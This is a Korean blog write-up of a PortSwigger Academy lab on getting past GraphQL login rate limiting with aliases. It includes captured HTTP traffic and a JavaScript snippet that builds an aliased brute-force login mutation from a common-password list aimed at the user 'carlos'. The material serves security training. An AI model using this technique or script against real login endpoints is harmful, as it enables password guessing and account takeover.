---
layout: post
title: "Burp Academy-GraphQL API 관련 취약점: Bypassing GraphQL brute force protections"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, GraphQL]
toc: true
last_modified_at: 2023-11-16 09:50:00 +0900
---


# 개요
- GraphQL 취약점 문제이다. 
- 문제 주소: https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass
- 취약점 설명페이지: https://portswigger.net/web-security/graphql
- 난이도: PRACTITIONER (보통)

# 문제 개요
- 이 랩에 있는 로그인 기능에는 GraphQL API로 만들어져 있다. 
- 로그인 기능에는 시도횟수 제한이 있다. 
- 랩을 풀려면 시도회수 제한을 우회해서 브루트포스 공격을 성공시켜 carlos 유저로 로그인하면 된다. 
- 후보 패스워드 리스트는 주어져있다.

```
The user login mechanism for this lab is powered by a GraphQL API. The API endpoint has a rate limiter that returns an error if it receives too many requests from the same origin in a short space of time.

To solve the lab, brute force the login mechanism to sign in as carlos. Use the list of authentication lab passwords as your password source.

We recommend that you install the InQL extension before attempting this lab. InQL makes it easier to modify GraphQL queries in Repeater.

For more information on using InQL, see Working with GraphQL in Burp Suite.
```

# 배경지식
## GraphQL aliases
- alias (에일리어스)라는 단어는 영단어로 가명을 의미한다. 
- GraphQL 오브젝트는 같은 이름으로 여러개의 프로퍼티를 포함할 수 없다. 예를들면 다음과 같은 쿼리는 `product`타입을 두번 리턴하기 때문에 GraphQL에세는 무효(invalid)한 쿼리이다. 

```gql
#Invalid query

query getProductDetails {
    getProduct(id: 1) {
        id
        name
    }
    getProduct(id: 2) {
        id
        name
    }
}
```

- alias (에일리어스)는 명시적으로 다른 이름을 지정함으로써 이 제한을 우회할 수 있다. 
- alias를 이용해서 동일한 타입의 여러 인스턴스를 하나의 요청으로 리턴할 수 있다. 이는 API 요청 회수를 효과적으로 줄일 수 있다. 
- 예를 들면 다음과 같다. product1, product2와 같은 식으로 다른 이름을 명시적으로 지정해주면 적법한 쿼리가 된다. 

```gql
#Valid query using aliases

query getProductDetails {
    product1: getProduct(id: "1") {
        id
        name
    }
    product2: getProduct(id: "2") {
        id
        name
    }
}

```

위 요청의 응답은 다음과 같이 된다. 

```

#Response to query

{
    "data": {
        "product1": {
            "id": 1,
            "name": "Juice Extractor"
            },
        "product2": {
            "id": 2,
            "name": "Fruit Overlays"
        }
    }
}
```

## aliases 를 사용해서 회수 제한을 우회하기(Bypassing rate limiting using aliases)
- alias 를 활용한 테크닉의 포인트는 **하나의 요청에 여러개의 쿼리를 포함할 수 있다**는 것이다. 
- 그렇다면 로그인 시도횟수 제한이 있는 엔드포인트에 대해서 한번에 여러개의 로그인시도 쿼리를 포함시키는 것으로 횟수 제한을 우회할 수 있을 것이다! 

# 풀이 
1. 로그인하는 부분을 살펴본다. 다음 요청과 응답이 관측된다. 

```http
POST /graphql/v1 HTTP/2
Host: 0aba00d80363ef3883d3d3500081003d.web-security-academy.net
Cookie: session=iu5T79019xvsssJwleg3IiCoxyQnAHGQ; session=RtpQCdJ3GSIvoagSmpv7o8qNskB2kf11
Content-Length: 189
Sec-Ch-Ua: "Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"
Accept: application/json
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Origin: https://0aba00d80363ef3883d3d3500081003d.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0aba00d80363ef3883d3d3500081003d.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7

{"variables": {"input": {"password": "peter", "username": "wiener"}}, "query": "mutation login($input: LoginInput!) {\n    login(input: $input) {\n        token\n        success\n    }\n}"}
```

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
Set-Cookie: session=qZrJU5LS5XhOr2sitroPmaK7aaQwszbf; Secure; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 113

{
  "data": {
    "login": {
      "token": "qZrJU5LS5XhOr2sitroPmaK7aaQwszbf",
      "success": true
    }
  }
}
```

2. 힌트를 통해서 브루트포스를 시도하는 GraphQL 쿼리를 생성해주는 자바스크립트 코드를 확인할 수 있다. 이를 웹 브라우저 콘솔에서 실행하면 GraphQL 쿼리가 클립보드에 카피된다. 

```js
copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=>`
bruteforce$index:login(input:{password: "$password", username: "carlos"}) {
        token
        success
    }
`.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log("The query has been copied to your clipboard.");
```

3. 로그인 요청을 Repeater로 보낸다. 그리고 쿼리를 조금 수정한다. 

다음 쿼리에서 `login($input: LoginInput!)` 부분을 `login`으로 바꾼다. 

```
mutation login($input: LoginInput!) {
    login(input: $input) {
        token
        success
    }
}
```

4. 그리고 쿼리 부분을 카피된 쿼리로 교체하고 송신해본다. 그러면 브루트포스가 성공하고 다음과 같은 응답이 되돌아온다.

![브루트포스 공격](/images/burp-academy-graphql-4-1.png)

5. `success` 부분의 값이 true인 것을 찾아본다. 그러면 여러 쿼리 실행결과중에 하나만 true인 것을 알 수 있다. 이 쿼리의 password값을 사용해서 carlos 유저로 로그인하면 문제가 풀린다. 

![풀이 성공](/images/burp-academy-graphql-4-success.png)